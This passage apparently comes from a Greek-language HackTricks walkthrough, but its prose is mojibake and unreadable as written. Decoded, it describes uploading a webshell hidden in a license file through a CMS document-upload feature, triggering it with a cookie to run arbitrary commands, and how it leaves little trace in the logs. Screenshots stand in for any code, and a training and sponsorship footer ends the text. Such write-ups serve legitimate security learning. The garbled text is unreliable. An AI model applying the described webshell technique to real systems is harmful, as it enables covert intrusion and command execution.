Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼Î±ÏƒÏ„Îµ Î¾Î±Î½Î¬ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± _Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î•Î³Î³ÏÎ¬Ï†Î¿Ï…_ (/media/add/document) Î³Î¹Î± Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎ¿Ï…Î¼Îµ Î­Î½Î± Webshell ÎºÏÏ…Î¼Î¼Î­Î½Î¿ Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Î¬Î´ÎµÎ¹Î±Ï‚.

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

### ÎœÎ­ÏÎ¿Ï‚ 4 (Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ Ï„Î¿ Webshell) <a href="#part-4-interaction-with-the-webshell" id="part-4-interaction-with-the-webshell"></a>

Î¤Î¿ Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î¿ Î¼Î­ÏÎ¿Ï‚ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î·Î½ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼Îµ Ï„Î¿ Webshell.

ÎŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÏ„Î¹Î³Î¼Î¹ÏŒÏ„Ï…Ï€Î¿ Î¿Î¸ÏŒÎ½Î·Ï‚, Î±Î½ Ï„Î¿ cookie Ï€Î¿Ï… Î±Î½Î±Î¼Î­Î½ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ Webshell Î¼Î±Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿, Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î¼Îµ Ï„Î¿ ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± ÏŒÏ„Î±Î½ ÏƒÏ…Î¼Î²Î¿Ï…Î»ÎµÏ…ÏŒÎ¼Î±ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ Web browser.

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

ÎŒÏ„Î±Î½ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¿ÏÎ¯ÏƒÎµÎ¹ Ï„Î¿ cookie, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î»Î»Î·Î»ÎµÏ€Î¹Î´ÏÎ¬ÏƒÎµÎ¹ Î¼Îµ Ï„Î¿ Webshell ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ ÎµÎ½Ï„Î¿Î»Î® Î¸Î­Î»ÎµÎ¹.

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

ÎšÎ±Î¹ ÏŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚, Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ Î­Ï‡ÎµÎ¹ Î¶Î·Ï„Î·Î¸ÎµÎ¯ Î¼ÏŒÎ½Î¿ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ txt.

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

Î£Î±Ï‚ ÎµÏ…Ï‡Î±ÏÎ¹ÏƒÏ„Ï Ï€Î¿Ï… Î±Ï†Î¹ÎµÏÏÏƒÎ±Ï„Îµ Ï‡ÏÏŒÎ½Î¿ Î³Î¹Î± Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿, ÎµÎ»Ï€Î¯Î¶Ï‰ Î½Î± ÏƒÎ±Ï‚ Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î¼ÎµÏÎ¹ÎºÎ¬ shells.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
